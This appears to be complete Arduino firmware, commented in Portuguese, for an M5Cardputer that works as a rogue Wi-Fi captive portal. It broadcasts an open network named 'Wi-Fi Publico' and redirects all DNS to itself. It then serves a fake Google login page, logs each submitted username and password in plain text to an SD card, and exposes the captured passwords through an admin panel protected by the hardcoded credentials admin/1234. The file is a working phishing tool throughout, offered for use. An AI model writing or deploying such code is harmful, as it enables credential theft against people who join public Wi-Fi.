#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPI.h>
#include <SD.h>
#include <M5Cardputer.h>
#include <algorithm>  // std::find

// ==================================================
//                REDE / SERVIÇOS
// ==================================================
const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

// Estado da UI
String wifiName           = "Wi-Fi Publico";
const char* loginPagePath = "/login";
int  connectedHosts       = 0;
bool inStatusScreen       = false;
bool inChangeWifiScreen   = false;
String newWifiName        = "";
int  selectedBox          = 0;
bool isTypingWifiName     = false;

M5Canvas canvas(&M5Cardputer.Display);

// Admin + arquivo exibido/baixado
const char* adminUser       = "admin";
const char* adminPass       = "1234";
const char* ADMIN_DATA_FILE = "/senhas.txt";


// ==================================================
// [1] TELA INICIAL (splash)
// ==================================================

// ==================================================
// [2] MENU (UI do dispositivo)
//     - Barra de bateria SOMENTE aqui
//     - Navegação: ,  /  ENTER  e  ` (ESC)
// ==================================================

// Botão arredondado com 1 ou 2 linhas
void drawButton(int x, int y, int w, int h,
                uint16_t borderColor, uint16_t fillColor,
                const char* labelTop, const char* labelBottom,
                int textSize) {
  // caixa
  M5Cardputer.Display.fillRoundRect(x, y, w, h, 8, fillColor);
  M5Cardputer.Display.drawRoundRect(x, y, w, h, 8, borderColor);

  // texto
  M5Cardputer.Display.setTextSize(textSize);
  M5Cardputer.Display.setTextColor(WHITE);

  int fontHeight  = M5Cardputer.Display.fontHeight();
  int totalHeight = (labelBottom[0] ? 2 : 1) * fontHeight + (labelBottom[0] ? 5 : 0);
  int startY      = y + (h - totalHeight) / 2;

  int labelTopWidth = M5Cardputer.Display.textWidth(labelTop);
  M5Cardputer.Display.setCursor(x + (w - labelTopWidth) / 2, startY);
  M5Cardputer.Display.println(labelTop);

  if (labelBottom[0]) {
    int labelBottomWidth = M5Cardputer.Display.textWidth(labelBottom);
    M5Cardputer.Display.setCursor(x + (w - labelBottomWidth) / 2, startY + fontHeight + 5);
    M5Cardputer.Display.println(labelBottom);
  }
}

// Barra de bateria (exibida só no MENU)
void drawBatteryBar(int x, int y) {
  int batteryLevel  = M5.Power.getBatteryLevel();
  int batteryWidth  = 40;
  int batteryHeight = 12;

  // moldura + “polo”
  M5Cardputer.Display.drawRoundRect(x, y, batteryWidth, batteryHeight, 3, WHITE);
  M5Cardputer.Display.fillRect(x + batteryWidth, y + 3, 4, 6, WHITE);

  // preenchimento
  int fillWidth  = (batteryWidth - 4) * batteryLevel / 100;
  uint16_t color = (batteryLevel < 20) ? RED : (batteryLevel < 50) ? ORANGE : GREEN;
  M5Cardputer.Display.fillRect(x + 2, y + 2, fillWidth, batteryHeight - 4, color);
}

// Dica no rodapé
void drawFooterInstruction(const char* msg) {
  int screenWidth = M5Cardputer.Display.width();
  int textWidth   = M5Cardputer.Display.textWidth(msg);
  int x           = (screenWidth - textWidth) / 2;
  int y           = M5Cardputer.Display.height() - 12;

  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setTextColor(ORANGE);
  M5Cardputer.Display.setCursor(x, y);
  M5Cardputer.Display.print(msg);
}

// Tela do MENU inicial (único lugar com a bateria)
void desenhar_elementos_iniciais_do_menu() {
  if (inChangeWifiScreen || inStatusScreen) return;

  M5Cardputer.Display.clearDisplay();

  // bateria no topo direito
  drawBatteryBar(M5Cardputer.Display.width() - 50, 5);

  // layout
  int spacing   = 10;
  int boxWidth  = (M5Cardputer.Display.width() - 3 * spacing) / 2;
  int boxHeight = M5Cardputer.Display.height() - 40;
  int boxY      = 20;

  // destaque do selecionado
  uint16_t box1Fill = (selectedBox == 0) ? DARKGREY : BLACK;
  uint16_t box2Fill = (selectedBox == 1) ? DARKGREY : BLACK;

  // botões (letras um pouco maiores no menu)
  drawButton(spacing,               boxY, boxWidth, boxHeight, GREEN, box1Fill, "Status",     "",      2);
  drawButton(2 * spacing + boxWidth, boxY, boxWidth, boxHeight, RED,   box2Fill, "Mudar", "Wi-Fi", 2);

  drawFooterInstruction("Use o direcional para navegar");
}


// ==================================================
// [3] PÁGINA WEB DE ADMIN (HTTP)
//     - /admin (carrega admin.html)
//     - /admin-data (retorna conteúdo de /senhas.txt)
//     - /download (baixa /senhas.txt)
// ==================================================

// /admin — página com interface (protegida por Basic Auth)
void handleAdmin() {
  if (!server.authenticate(adminUser, adminPass)) {
    return server.requestAuthentication();  // Basic Auth
  }
  File page = SD.open("/admin.html", FILE_READ);
  if (!page) { server.send(404, "text/plain", "admin.html nao encontrado no SD"); return; }
  server.streamFile(page, "text/html");
  page.close();
}

// /admin-data — texto de /senhas.txt (usado pelo fetch() do admin.html)
void handleAdminData() {
  if (!server.authenticate(adminUser, adminPass)) {
    return server.requestAuthentication();
  }
  File f = SD.open(ADMIN_DATA_FILE, FILE_READ);
  if (!f) { server.send(404, "text/plain", "Arquivo de dados nao encontrado"); return; }
  server.sendHeader("Cache-Control", "no-store");
  server.streamFile(f, "text/plain");
  f.close();
}

// /download — baixa o mesmo arquivo exibido
void handleDownload() {
  if (!server.authenticate(adminUser, adminPass)) {
    return server.requestAuthentication();
  }
  File f = SD.open(ADMIN_DATA_FILE, FILE_READ);
  if (!f) { server.send(404, "text/plain", "Arquivo nao encontrado"); return; }
  server.streamFile(f, "text/plain");
  f.close();
}


// ==================================================
// [4] PÁGINA PARA CAPTURAR A SENHA (cativo)
//     - /        (serve google.html do SD)
//     - /login   (POST, grava user+pass em /senhas.txt)
// ==================================================

// Página inicial do portal cativo
void handleRoot() {
  File file = SD.open("/google.html");
  if (file) {
    server.streamFile(file, "text/html");
    file.close();
  } else {
    server.send(404, "text/plain", "Page not found");
  }
}

// POST /login — salva credenciais em texto puro (senhas.txt)
void handleLogin() {
  if (server.hasArg("username") && server.hasArg("password")) {
    String username = server.arg("username");
    String password = server.arg("password");

    File file = SD.open("/senhas.txt", FILE_APPEND);
    if (file) {
      file.println("Username: " + username + " Password: " + password + "\n");
      file.close();
    }
    server.send(200, "text/html",
                "<html><body><h1>Conectado com sucesso!</h1></body></html>");
  } else {
    server.send(400, "text/plain", "Campos faltando");
  }
}


// ==================================================
// [5] TROCAR O NOME DO Wi-Fi + TELA DE STATUS
// ==================================================

// Remove linhas em branco de /senhas.txt (chamado na tela de status)
void excluir_linhas_vazias() {
  File file     = SD.open("/senhas.txt");
  String line   = "";
  File tempFile = SD.open("/temp_senhas.txt", FILE_WRITE);

  if (file && tempFile) {
    while (file.available()) {
      line = file.readStringUntil('\n');
      line.trim();
      if (line.length() > 0) tempFile.println(line);
    }
    file.close();
    tempFile.close();
    SD.remove("/senhas.txt");
    SD.rename("/temp_senhas.txt", "/senhas.txt");
  } else {
    Serial.println("Falha ao abrir o arquivo");
  }
}

// Tela STATUS (sem bateria)
void mostrar_status() {
  connectedHosts = WiFi.softAPgetStationNum();

  M5Cardputer.Display.fillScreen(BLACK);
  M5Cardputer.Display.setTextColor(WHITE);
  M5Cardputer.Display.setTextSize(1);

  M5Cardputer.Display.setCursor(10, 10);
  M5Cardputer.Display.println("Nome do Wi-Fi:");
  M5Cardputer.Display.setCursor(10, 30);
  M5Cardputer.Display.println(wifiName.c_str());

  M5Cardputer.Display.setCursor(10, 60);
  M5Cardputer.Display.println("Hosts conectados:");
  M5Cardputer.Display.setCursor(10, 80);
  M5Cardputer.Display.println(connectedHosts);

  // contar linhas não vazias
  File file = SD.open("/senhas.txt");
  int  lineCount = 0;

  if (file) {
    String line = "";
    while (file.available()) {
      line = file.readStringUntil('\n');
      line.trim();
      if (line.length() > 0) lineCount++;
    }
    file.close();

    M5Cardputer.Display.setCursor(10, 100);
    M5Cardputer.Display.print("Senhas: ");
    M5Cardputer.Display.println(lineCount);
  } else {
    M5Cardputer.Display.setTextColor(RED);
    M5Cardputer.Display.setCursor(10, 100);
    M5Cardputer.Display.println("Falha senhas.txt");
  }

  // instrução de retorno
  M5Cardputer.Display.setCursor(10, M5Cardputer.Display.height() - 20);
  M5Cardputer.Display.setTextColor(BLUE);
  M5Cardputer.Display.println("ESC para voltar");

  inStatusScreen = true;
  excluir_linhas_vazias();
}

// Tela para digitar o novo SSID (sem bateria)
void mostrar_alteracao_tela_Wifi() {
  newWifiName = "";

  M5Cardputer.Display.fillScreen(BLACK);
  M5Cardputer.Display.setTextColor(WHITE);
  M5Cardputer.Display.setTextSize(1);

  M5Cardputer.Display.setCursor(10, 10);
  M5Cardputer.Display.println("Digite o nome e aperte OK.");
  M5Cardputer.Display.drawLine(0, 30, M5Cardputer.Display.width(), 30, GREEN);

  M5Cardputer.Display.setCursor(10, 50);
  M5Cardputer.Display.println(newWifiName);

  M5Cardputer.Display.setCursor(10, M5Cardputer.Display.height() - 20);
  M5Cardputer.Display.setTextColor(BLUE);
  M5Cardputer.Display.println("ESC para voltar");

  isTypingWifiName   = true;
  inChangeWifiScreen = true;
}

// Aplica novo SSID e volta ao MENU
void aplicar_novo_nome_Wifi() {
  wifiName = newWifiName;
  WiFi.softAP(wifiName.c_str(), NULL);

  M5Cardputer.Display.fillScreen(BLACK);
  M5Cardputer.Display.setTextColor(WHITE);
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setCursor(10, 10);
  M5Cardputer.Display.println("Wi-Fi atualizado com sucesso!");

  delay(1000);
  inChangeWifiScreen = false;
  isTypingWifiName   = false;

  M5Cardputer.Display.fillScreen(BLACK);
  desenhar_elementos_iniciais_do_menu();
}


// ==================================================
// SETUP
// ==================================================
void setup() {
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
  M5Cardputer.Display.setRotation(1);

  // Fonte base pequena (neutra)
  M5Cardputer.Display.setFont(&fonts::Font0);
  M5Cardputer.Display.setTextColor(WHITE);
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.fillScreen(BLACK);

  // SD pronto desde o início
  SD.begin();


  // AP com SSID atual
  WiFi.mode(WIFI_AP);
  WiFi.softAP(wifiName.c_str(), NULL);

  // MENU já no boot (com bateria)
  desenhar_elementos_iniciais_do_menu();

  // DNS cativo + HTTP
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  server.onNotFound(handleRoot);
  server.on(loginPagePath, HTTP_POST, handleLogin);

  // Rotas do painel admin
  server.on("/admin",      HTTP_GET, handleAdmin);
  server.on("/admin-data", HTTP_GET, handleAdminData);
  server.on("/download",   HTTP_GET, handleDownload);

  server.begin();

  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
}


// ==================================================
// LOOP
// ==================================================
void loop() {
  M5Cardputer.update();

  // Atualiza nº de hosts na tela de status a cada 1s
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate >= 1000) {
    lastUpdate = millis();
    if (inStatusScreen) {
      M5Cardputer.Display.fillRect(10, 80, 100, 20, BLACK);
      M5Cardputer.Display.setCursor(10, 80);
      M5Cardputer.Display.setTextColor(WHITE);
      M5Cardputer.Display.setTextSize(1);
      M5Cardputer.Display.println(WiFi.softAPgetStationNum());
    }
  }

  // Teclado / Navegação
  if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
    auto status = M5Cardputer.Keyboard.keysState();

    // --- Tela "Mudar Wi-Fi" ---
    if (inChangeWifiScreen) {
      // texto digitado
      for (auto c : status.word) newWifiName += c;

      // backspace
      if (status.del && !newWifiName.isEmpty())
        newWifiName.remove(newWifiName.length() - 1);

      // re-renderiza input
      M5Cardputer.Display.fillRect(10, 50, M5Cardputer.Display.width(), 20, BLACK);
      M5Cardputer.Display.setCursor(10, 50);
      M5Cardputer.Display.setTextColor(WHITE);
      M5Cardputer.Display.setTextSize(1);
      M5Cardputer.Display.println(newWifiName);

      // ENTER confirma
      if (status.enter) aplicar_novo_nome_Wifi();

      // ESC (`) volta ao menu
      if (std::find(status.word.begin(), status.word.end(), '`') != status.word.end()) {
        inChangeWifiScreen = false;
        isTypingWifiName   = false;
        newWifiName        = "";
        M5Cardputer.Display.fillScreen(BLACK);
        desenhar_elementos_iniciais_do_menu();
      }
      return;
    }

    // --- Tela "Status" ---
    if (inStatusScreen) {
      // ESC (`) volta ao menu
      if (std::find(status.word.begin(), status.word.end(), '`') != status.word.end()) {
        inStatusScreen = false;
        M5Cardputer.Display.fillScreen(BLACK);
        desenhar_elementos_iniciais_do_menu();
      }
      return;
    }

    // --- MENU: seleção por teclas ---
    // vírgula (,) seleciona "Status"
    if (std::find(status.word.begin(), status.word.end(), ',') != status.word.end()) {
      selectedBox = 0;
      desenhar_elementos_iniciais_do_menu();
    }
    // barra (/) seleciona "Mudar Wi-Fi"
    if (std::find(status.word.begin(), status.word.end(), '/') != status.word.end()) {
      selectedBox = 1;
      desenhar_elementos_iniciais_do_menu();
    }
    // ENTER abre a tela
    if (status.enter) {
      if (selectedBox == 0) mostrar_status();
      else                 mostrar_alteracao_tela_Wifi();
    }
  }

  // Serviços de rede
  dnsServer.processNextRequest();
  server.handleClient();
}
